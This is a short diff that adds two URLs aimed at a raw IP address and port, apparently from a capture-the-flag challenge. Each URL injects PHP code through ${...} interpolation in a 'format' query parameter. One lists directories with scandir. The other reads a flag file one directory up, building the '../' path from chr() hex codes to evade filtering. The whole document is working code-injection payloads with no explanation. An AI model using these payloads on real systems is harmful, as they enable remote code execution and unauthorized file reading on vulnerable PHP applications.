@@ -1,0 +1,2 @@
+http://138.68.189.41:31011/?format=r${print(scandir(scandir(getcwd())[1])[8])}
+http://138.68.189.41:31011/?format=r${print(file_get_contents(chr(0x2e).chr(0x2e).chr(0x2f).flagF8jiU))}
